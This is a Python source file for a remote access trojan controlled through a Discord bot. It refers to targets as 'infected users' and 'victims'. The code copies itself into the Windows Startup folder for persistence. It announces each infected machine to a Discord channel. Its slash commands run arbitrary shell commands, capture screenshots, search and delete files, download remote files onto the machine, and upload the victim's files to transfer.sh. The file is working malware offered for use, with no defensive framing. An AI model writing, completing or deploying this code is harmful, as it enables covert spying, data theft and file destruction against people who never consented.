import os
import os.path
import time
import urllib.request
from os import getenv, startfile
from os.path import join, exists
from shutil import copy

import discord
import pyautogui
import requests
from discord import *
from discord.utils import get

global Ping_On_Startup
global Token
global GuildId
GuildId = "Guild Id here"
# guild id here
Token = ""
# Bot Token Here Obviously
# Bot needs all intents
Ping_On_Startup = True
# if the bot should ping you when an infected user starts his Computer


path = "%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/control.pyw" % getenv("userprofile")
if not exists(path):
	copy(__file__, path)
	startfile(path)


class Control(discord.Client):
	def __init__(self):
		super().__init__(intents=discord.Intents.all())
		self.tree = app_commands.CommandTree(self)

	async def setup_hook(self):
		self.tree.copy_global_to(guild=discord.Object(id=GuildId))
		await self.tree.sync(guild=discord.Object(id=GuildId))


bot = Control()


@bot.event
async def on_ready():
	# print(f"logged in as [{bot.user}]")
	username = os.getenv("USERNAME")
	for guild in bot.guilds:
		channel = get(guild.text_channels, name="d")
		if Ping_On_Startup:
			await channel.send(f"@everyone `{username}` started `{__file__}` <:control:1029794910695596074>")


def download(url: str, directory: str, filename: str):
	loc = directory + "\\" + filename
	try:
		output = urllib.request.urlretrieve(url, loc)
	except Exception as err:
		output = f"Error: {err}"
	return output


def delete(Filelocation: str):
	Filelocation = Filelocation.casefold().replace("%user%", os.getenv("USERNAME"))
	Filelocation = Filelocation.casefold().replace("%username%", os.getenv("USERNAME"))
	if exists(Filelocation):
		os.remove(Filelocation)
		output = f"File `{Filelocation}` deleted"
	else:
		output = f"File `{Filelocation}` not found"
	return output


def transfer(Filelocation: str):
	Filelocation = Filelocation.casefold().replace("%user%", os.getenv("USERNAME"))
	Filelocation = Filelocation.casefold().replace("%username%", os.getenv("USERNAME"))

	if exists(Filelocation):
		fileToUpload = {"file": (Filelocation, open(Filelocation, mode='rb'))}
		r = requests.post("https://transfer.sh/", files=fileToUpload)
		output = r.text
	else:
		output = f"File {Filelocation} not found"
	return output


def doScreenshot():
	name = time.strftime("%Y%m%d-%H%M%S.jpg")
	path = join(os.getenv("TEMP"), name)
	img = pyautogui.screenshot(path)
	return name, path


def ListDir(directory):
	s = ""
	dirToList = directory
	if exists(dirToList):
		ListedDir = os.listdir(dirToList)
		for i in ListedDir:
			# s += i + "\n"
			s += f" -> `{i}`\n"
	else:
		s = f"Directory `{dirToList}` not found"

	return s


def searchFile(directory: str, keyword: str):
	output = ""
	directory = directory.casefold().replace("%user%", os.getenv("USERNAME"))
	directory = directory.casefold().replace("%username%", os.getenv("USERNAME"))
	if exists(directory):
		Files = os.listdir(directory)
		found_files = []
		for file in Files:
			if keyword.lower() in file.lower():
				found_files.append(file)
		if found_files:
			output = f"Found Files in `{directory}`:\n"
			for file in found_files:
				output += f" -> {file}\n"
		else:
			output = f"File not found"
		return output

	else:
		output = f"Directory `{directory}` not found"
	return output.format()


@bot.tree.command(name="cmd", description="execute command in cmd")
async def cmd(interaction: discord.Interaction, command: str):
	await interaction.response.send_message(f"executing command `{command}`...")
	x = ""
	try:
		x = os.popen(command).read()
	except Exception as err:
		await interaction.channel.send(f"Error: {err}")
	if x == "":
		await interaction.channel.send(f"Command `{command}` doesn't return anything/isn't valid")
	else:
		await interaction.channel.send(f"command `{command}` returned:\n ```{x}```")


@bot.tree.command(name="listdir", description="list all files in a specific directory (use %user% instead of username)")
async def cmd(interaction: discord.Interaction, directory: str):
	directory = directory.casefold().replace("%user%", os.getenv("USERNAME"))
	directory = directory.casefold().replace("%USERNAME%", os.getenv("USERNAME"))
	await interaction.response.send_message(f"displaying `{directory}`...")
	await interaction.channel.send(f"{ListDir(directory)}")


@bot.tree.command(name="screenshot", description="get a screenshot of the victim")
async def scr(interaction: discord.Interaction):
	name, path = doScreenshot()
	await interaction.response.send_message(f"Screenshot taken, sending...")
	await interaction.channel.send(file=discord.File(path))
	print(path)
	os.remove(path)


@bot.tree.command(name="upload",
                  description="upwnload a file of the victim to transfer.sh (use %user% instead of username)")
async def scr(interaction: discord.Interaction, location: str):
	await interaction.response.send_message(f"searching for `{location}`...")
	await interaction.channel.send(transfer(location))


@bot.tree.command(name="search",
                  description="search for a file on the victim's pc pc (use %user% instead of username)")
async def scr(interaction: discord.Interaction, location: str, keyword: str):
	await interaction.response.send_message(f"searching for keyword `{keyword}` in `{location}`...")
	await interaction.channel.send(searchFile(location, keyword))


@bot.tree.command(name="delete", description="delete a file of the victim (use %user% instead of username)")
async def scr(interaction: discord.Interaction, locinput: str):
	await interaction.response.send_message(f"searching for `{locinput}`...")
	await interaction.channel.send(delete(locinput))


@bot.tree.command(name="download",
                  description="download a file on the machine of the victim (needs to be raw [eg. github raw))")
async def scr(interaction: discord.Interaction, targeturl: str, directory: str, filename: str):
	await interaction.response.send_message(f"searching for `{targeturl}`...")
	await interaction.channel.send(download(targeturl, directory, filename))


bot.run(token=Token)
